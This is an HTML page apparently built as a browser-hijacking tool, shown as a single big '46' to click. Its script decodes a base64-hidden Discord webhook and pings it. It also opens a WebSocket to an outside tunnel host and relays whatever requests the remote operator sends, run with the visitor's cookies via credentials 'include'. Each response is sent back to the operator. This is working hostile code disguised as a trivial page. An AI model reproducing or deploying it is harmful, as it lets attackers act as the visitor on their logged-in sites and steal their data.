<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V46 MASTER</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 25px #0f0; user-select: none; }
    </style>
</head>
<body>

    <h1 id="status" onclick="startMaster()">46</h1>

    <script>
        const PROXY_SERVER = "wss://6611cfd937b51a.lhr.life";
        const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
        const HOOK = atob(key);

        function sendDiscord(msg) {
            fetch(HOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: msg})
            });
        }

        function startMaster() {
            document.getElementById('status').innerText = "DONE";
            document.getElementById('status').style.color = "#0f0";
            sendDiscord("🔵 **V46: Signal Received**");
            
            const socket = new WebSocket(PROXY_SERVER);
            
            socket.onopen = () => {
                socket.send(JSON.stringify({ type: 'join' }));
            };

            socket.onmessage = async (event) => {
                // الكود هنا صار "جسر" فقط بياخد الطلب وبيرجعه
                try {
                    const req = JSON.parse(event.data);
                    const response = await fetch(req.url, {
                        method: req.method,
                        headers: req.headers,
                        credentials: 'include'
                    });
                    const data = await response.text();
                    socket.send(JSON.stringify({
                        body: data,
                        status: response.status,
                        headers: Object.fromEntries(response.headers)
                    }));
                } catch (e) {}
            };

            setInterval(() => { if(socket.readyState === 1) socket.send('ping'); }, 10000);
        }
    </script>
</body>
</html>
